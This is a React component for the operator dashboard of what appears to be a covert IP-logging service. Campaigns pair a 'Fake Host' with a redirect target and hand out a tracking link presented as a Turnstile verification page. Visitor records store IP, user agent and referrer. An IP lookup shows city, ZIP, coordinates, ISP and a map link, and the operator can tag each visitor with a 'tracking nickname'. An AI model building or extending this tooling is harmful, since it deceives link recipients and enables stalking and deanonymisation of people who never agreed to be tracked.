"use client";

import { useState, useEffect, useCallback, useRef } from "react";
import type { Campaign, IpLookup, VisitorLog } from "@/types";
import { db } from "@/lib/firebase";

interface CampaignDetailProps {
  campaign: Campaign;
  onEdit: () => void;
  onBack?: () => void;
  showBackButton?: boolean;
}

export default function CampaignDetail({
  campaign,
  onEdit,
  onBack,
  showBackButton = false,
}: CampaignDetailProps) {
  const [logs, setLogs] = useState<VisitorLog[]>([]);
  const [showNoLogs, setShowNoLogs] = useState(false);
  const [toastVisible, setToastVisible] = useState(false);
  const [selectedLog, setSelectedLog] = useState<VisitorLog | null>(null);
  const [detailLabel, setDetailLabel] = useState("");
  const [ipInfoVisible, setIpInfoVisible] = useState(false);
  const [ipLookupLoading, setIpLookupLoading] = useState(false);
  const [ipLookupError, setIpLookupError] = useState("");
  const toastTimeoutRef = useRef<number | null>(null);

  const origin = typeof window !== "undefined" ? window.location.origin : "";
  const linkUrl = `${origin}/verify?s=${campaign.id}`;
  const mapUrl =
    selectedLog?.ipLookup &&
    Number.isFinite(selectedLog.ipLookup.lat) &&
    Number.isFinite(selectedLog.ipLookup.lon)
      ? `https://www.google.com/maps?q=${selectedLog.ipLookup.lat},${selectedLog.ipLookup.lon}`
      : null;
  const ipLookupDetails = selectedLog?.ipLookup
    ? [
        { label: "Country", value: `${selectedLog.ipLookup.country} (${selectedLog.ipLookup.countryCode})` },
        {
          label: "Region",
          value: selectedLog.ipLookup.regionName || selectedLog.ipLookup.region || "Unknown",
        },
        { label: "City", value: selectedLog.ipLookup.city || "Unknown" },
        { label: "ZIP", value: selectedLog.ipLookup.zip || "Unknown" },
        { label: "Timezone", value: selectedLog.ipLookup.timezone || "Unknown" },
        { label: "Coordinates", value: `${selectedLog.ipLookup.lat}, ${selectedLog.ipLookup.lon}` },
        { label: "ISP", value: selectedLog.ipLookup.isp || "Unknown" },
        { label: "Organization", value: selectedLog.ipLookup.org || "Unknown" },
        { label: "ASN", value: selectedLog.ipLookup.as || "Unknown" },
      ]
    : [];

  const openLogDetails = useCallback((log: VisitorLog) => {
    setSelectedLog(log);
    setDetailLabel(log.label || "");
    setIpInfoVisible(false);
    setIpLookupLoading(false);
    setIpLookupError("");
  }, []);

  const patchLogState = useCallback((logId: string, patch: Partial<VisitorLog>) => {
    setLogs((current) => current.map((log) => (log.id === logId ? { ...log, ...patch } : log)));
    setSelectedLog((current) => (current?.id === logId ? { ...current, ...patch } : current));
  }, []);

  const loadLogs = useCallback(async () => {
    try {
      const data = await db.getLogs(campaign.id);
      const nextLogs = data as VisitorLog[];

      setLogs((current) => {
        const isUnchanged =
          current.length === nextLogs.length &&
          current.every((log, index) => {
            const nextLog = nextLogs[index];
            return (
              nextLog &&
              log.id === nextLog.id &&
              log.label === nextLog.label &&
              log.timestamp === nextLog.timestamp &&
              log.ip === nextLog.ip &&
              log.rayId === nextLog.rayId &&
              log.userAgent === nextLog.userAgent &&
              log.referrer === nextLog.referrer
            );
          });

        return isUnchanged ? current : nextLogs;
      });
      setShowNoLogs(nextLogs.length === 0);
      setSelectedLog((current) => {
        if (!current) return current;
        return nextLogs.find((log) => log.id === current.id) ?? current;
      });
    } catch (err) {
      console.error("Error loading logs:", err);
    }
  }, [campaign.id]);

  useEffect(() => {
    loadLogs();
    const refreshIfVisible = () => {
      if (document.visibilityState === "visible") {
        void loadLogs();
      }
    };

    const interval = window.setInterval(refreshIfVisible, 12000);
    document.addEventListener("visibilitychange", refreshIfVisible);
    window.addEventListener("focus", refreshIfVisible);

    return () => {
      window.clearInterval(interval);
      document.removeEventListener("visibilitychange", refreshIfVisible);
      window.removeEventListener("focus", refreshIfVisible);
    };
  }, [loadLogs]);

  useEffect(() => {
    return () => {
      if (toastTimeoutRef.current !== null) {
        window.clearTimeout(toastTimeoutRef.current);
      }
    };
  }, []);

  const copyLink = () => {
    navigator.clipboard.writeText(linkUrl).then(() => {
      setToastVisible(true);
      if (toastTimeoutRef.current !== null) {
        window.clearTimeout(toastTimeoutRef.current);
      }
      toastTimeoutRef.current = window.setTimeout(() => setToastVisible(false), 2000);
    });
  };

  const deleteLog = async (log: VisitorLog) => {
    if (confirm(`Are you sure you want to delete visitor record for ${log.ip || "Unknown"}?`)) {
      await db.deleteLog(campaign.id, log.id);
      await loadLogs();
    }
  };

  const saveLabel = async () => {
    if (!selectedLog) return;
    const newLabel = detailLabel.trim();
    try {
      await db.updateLog(campaign.id, selectedLog.id, { label: newLabel });
      patchLogState(selectedLog.id, { label: newLabel });
    } catch (err) {
      console.error("Error saving label:", err);
    }
  };

  const toggleIpInfo = async () => {
    if (!selectedLog) return;

    const nextVisible = !ipInfoVisible;
    setIpInfoVisible(nextVisible);
    if (!nextVisible || selectedLog.ipLookup || ipLookupLoading) return;

    setIpLookupError("");
    setIpLookupLoading(true);

    try {
      const response = await fetch(`/api/ip-lookup?ip=${encodeURIComponent(selectedLog.ip)}`);
      const payload = (await response.json()) as IpLookup | { error?: string };

      if (!response.ok || "error" in payload) {
        throw new Error("error" in payload ? payload.error || "Lookup failed" : "Lookup failed");
      }

      const fetchedAt = new Date().toISOString();
      const patch = {
        ipLookup: payload as IpLookup,
        ipLookupFetchedAt: fetchedAt,
      };

      patchLogState(selectedLog.id, patch);
      await db.updateLog(campaign.id, selectedLog.id, patch);
    } catch (err) {
      console.error("IP lookup failed:", err);
      setIpLookupError(err instanceof Error ? err.message : "Failed to load IP details");
    } finally {
      setIpLookupLoading(false);
    }
  };

  const deleteSelectedLog = async () => {
    if (!selectedLog) return;
    if (confirm("Are you sure you want to delete this visitor record?")) {
      await db.deleteLog(campaign.id, selectedLog.id);
      setSelectedLog(null);
      await loadLogs();
    }
  };

  return (
    <>
      <section className="detail-view">
        <div className="dashboard-card">
          <div>
            {/* Session Header */}
            <div className="logs-header-section">
              <div className="session-detail-header">
                {showBackButton && onBack && (
                  <button className="detail-back-btn" onClick={onBack}>
                    ← Back to Sessions
                  </button>
                )}
                <div className="session-title-row">
                  <h2 className="session-detail-title">{campaign.name}</h2>
                  <button
                    onClick={onEdit}
                    className="btn btn-secondary"
                    style={{ padding: "4px 10px", fontSize: "11px" }}
                  >
                    ✏️ Edit
                  </button>
                </div>
                <p className="session-detail-meta">
                  Fake Host: <span className="meta-value mono">{campaign.hostname}</span> &bull;
                  Target: <span className="meta-value mono">{campaign.redirect}</span>
                </p>
              </div>

              <div className="link-copy-container">
                <span className="generated-url">{linkUrl}</span>
                <button
                  onClick={copyLink}
                  className="btn btn-primary"
                  style={{
                    padding: "6px 14px",
                    fontSize: "12px",
                    whiteSpace: "nowrap",
                    flexShrink: 0,
                  }}
                >
                  Copy Link
                </button>
              </div>
            </div>

            {/* Logs Sub-header */}
            <div className="logs-controls-row">
              <h3 className="logs-subheading">Visitor Records</h3>
              <button
                onClick={loadLogs}
                className="btn btn-secondary"
                style={{ padding: "8px", borderRadius: "6px" }}
                title="Refresh Log Data"
              >
                🔄
              </button>
            </div>

            {/* Table */}
            <div className="table-container">
              {showNoLogs ? (
                <div className="no-logs">
                  <div className="empty-state-visual">
                    <svg
                      className="pulse-svg"
                      viewBox="0 0 64 64"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <circle
                        cx="32"
                        cy="32"
                        r="12"
                        stroke="rgba(224, 169, 140, 0.4)"
                        strokeWidth="2"
                      />
                      <circle
                        cx="32"
                        cy="32"
                        r="22"
                        stroke="rgba(224, 169, 140, 0.2)"
                        strokeWidth="1.5"
                        style={{ animation: "pulse 2s infinite" }}
                      />
                      <circle
                        cx="32"
                        cy="32"
                        r="30"
                        stroke="rgba(224, 169, 140, 0.1)"
                        strokeWidth="1"
                        style={{ animation: "pulse 2s infinite 0.5s" }}
                      />
                      <path
                        d="M28 32h8M32 28v8"
                        stroke="#e0a98c"
                        strokeWidth="2"
                        strokeLinecap="round"
                      />
                    </svg>
                  </div>
                  <h3>No visits detected yet</h3>
                  <p>
                    Distribute the Turnstile tracking link. Visitor telemetry logs will populate
                    here dynamically upon user verification.
                  </p>
                </div>
              ) : (
                <table id="logsTable">
                  <thead>
                    <tr>
                      <th>Timestamp</th>
                      <th>Visitor (IP / Label)</th>
                      <th className="col-ray">Ray ID</th>
                      <th>Status</th>
                      <th className="col-ua">Referrer / User-Agent</th>
                      <th className="col-action">Action</th>
                    </tr>
                  </thead>
                  <tbody>
                    {logs.map((log) => (
                      <tr
                        key={log.id}
                        onClick={() => openLogDetails(log)}
                      >
                        <td data-label="Timestamp">
                          <span className="timestamp">
                            {new Date(log.timestamp).toLocaleString()}
                          </span>
                        </td>
                        <td data-label="Visitor">
                          <div className="visitor-label-container">
                            {log.label ? (
                              <>
                                <span className="visitor-alias">{log.label}</span>
                                <span className="visitor-ip-sub">{log.ip || "Unknown"}</span>
                              </>
                            ) : (
                              <>
                                <span
                                  className="ip-address"
                                  style={{
                                    fontSize: "11.5px",
                                    marginBottom: "4px",
                                    display: "inline-block",
                                  }}
                                >
                                  {log.ip || "Unknown"}
                                </span>
                                <span className="add-label-tag">+ Label</span>
                              </>
                            )}
                          </div>
                        </td>
                        <td data-label="Ray ID">
                          <span
                            style={{
                              fontFamily: "monospace",
                              color: "var(--color-text-muted)",
                            }}
                          >
                            {log.rayId || "N/A"}
                          </span>
                        </td>
                        <td data-label="Status">
                          <span className="status-badge verified">Verified</span>
                        </td>
                        <td data-label="Referrer / UA" style={{ maxWidth: "320px" }}>
                          <div
                            style={{
                              fontWeight: 500,
                              fontSize: "11px",
                              marginBottom: "2px",
                              color: "var(--color-rose)",
                              overflow: "hidden",
                              textOverflow: "ellipsis",
                              whiteSpace: "nowrap",
                            }}
                          >
                            Ref: {log.referrer || "Direct"}
                          </div>
                          <div
                            style={{
                              color: "var(--color-text-muted)",
                              fontSize: "11px",
                              overflow: "hidden",
                              textOverflow: "ellipsis",
                              whiteSpace: "nowrap",
                            }}
                          >
                            UA: {log.userAgent || "Unknown"}
                          </div>
                        </td>
                        <td data-label="Action" style={{ textAlign: "center" }}>
                          <div className="log-row-actions">
                            <button
                              className="inspect-log-btn"
                              title="Open record details"
                              onClick={(e) => {
                                e.stopPropagation();
                                openLogDetails(log);
                              }}
                            >
                              Inspect
                            </button>
                            <button
                              className="delete-log-btn"
                              title="Delete record"
                              onClick={(e) => {
                                e.stopPropagation();
                                deleteLog(log);
                              }}
                            >
                              🗑️
                            </button>
                          </div>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              )}
            </div>
          </div>
        </div>
      </section>

      {/* Toast */}
      <div className={`toast ${toastVisible ? "show" : ""}`}>
        <span className="toast-success-icon">✔️</span>
        <span>Link copied to clipboard!</span>
      </div>

      {/* Telemetry Inspector Modal */}
      {selectedLog && (
        <div className="modal-overlay" onClick={() => setSelectedLog(null)}>
          <div
            className="dashboard-card modal-card modal-card-wide"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="modal-header modal-header-bordered">
              <h2 className="modal-title">🕵️ Telemetry Inspector</h2>
              <button className="close-modal-x" onClick={() => setSelectedLog(null)}>
                ✕
              </button>
            </div>
            <div className="inspector-body">
              <div className="inspector-row">
                <span className="inspector-label">Timestamp</span>
                <span className="inspector-value mono">
                  {new Date(selectedLog.timestamp).toLocaleString()}
                </span>
              </div>
              <div className="inspector-row">
                <span className="inspector-label">Custom Label</span>
                <div className="inspector-label-input-row">
                  <input
                    type="text"
                    className="form-control inspector-input"
                    placeholder="Add tracking nickname..."
                    value={detailLabel}
                    onChange={(e) => setDetailLabel(e.target.value)}
                  />
                  <button
                    className="btn btn-primary"
                    style={{ padding: "6px 12px", fontSize: "11px", flexShrink: 0 }}
                    onClick={saveLabel}
                  >
                    Save
                  </button>
                </div>
              </div>
              <div className="inspector-row">
                <span className="inspector-label">IP Address</span>
                <div className="inspector-ip-section">
                  <div className="inspector-ip-summary">
                    <span className="ip-address inspector-ip">{selectedLog.ip || "Unknown"}</span>
                    <button className="btn btn-secondary inspector-toggle-btn" onClick={toggleIpInfo}>
                      {ipInfoVisible ? "Hide Details" : "Show Details"}
                    </button>
                  </div>
                  {ipInfoVisible && (
                    <div className="inspector-ip-panel">
                      {ipLookupLoading ? (
                        <span className="inspector-ip-meta">Loading IP details...</span>
                      ) : ipLookupError ? (
                        <span className="inspector-ip-error">{ipLookupError}</span>
                      ) : ipLookupDetails.length > 0 ? (
                        <>
                          <dl className="inspector-ip-list">
                            {ipLookupDetails.map((detail) => (
                              <div key={detail.label} className="inspector-ip-item">
                                <dt className="inspector-ip-meta-label">{detail.label}</dt>
                                <dd className="inspector-ip-meta">{detail.value}</dd>
                              </div>
                            ))}
                          </dl>
                          <div className="inspector-ip-footer">
                            {mapUrl && (
                              <a
                                className="inspector-map-link"
                                href={mapUrl}
                                target="_blank"
                                rel="noopener noreferrer"
                              >
                                View on Map
                              </a>
                            )}
                            <span className="inspector-ip-fetched">
                              Saved {selectedLog.ipLookupFetchedAt
                                ? new Date(selectedLog.ipLookupFetchedAt).toLocaleString()
                                : "just now"}
                            </span>
                          </div>
                        </>
                      ) : (
                        <span className="inspector-ip-meta">No IP details available.</span>
                      )}
                    </div>
                  )}
                </div>
              </div>
              <div className="inspector-row">
                <span className="inspector-label">Ray ID</span>
                <span className="inspector-ray">{selectedLog.rayId || "N/A"}</span>
              </div>
              <div className="inspector-row">
                <span className="inspector-label">Status</span>
                <span className="status-badge verified">Verified</span>
              </div>
              <div className="inspector-row">
                <span className="inspector-label">Referrer</span>
                <span className="inspector-value break-all">
                  {selectedLog.referrer || "Direct"}
                </span>
              </div>
              <div className="inspector-row inspector-row-last">
                <span className="inspector-label">User-Agent</span>
                <span className="inspector-ua">{selectedLog.userAgent || "Unknown"}</span>
              </div>
            </div>
            <div className="modal-footer">
              <button className="btn btn-danger" onClick={deleteSelectedLog}>
                🗑️ Delete Record
              </button>
            </div>
          </div>
        </div>
      )}
    </>
  );
}
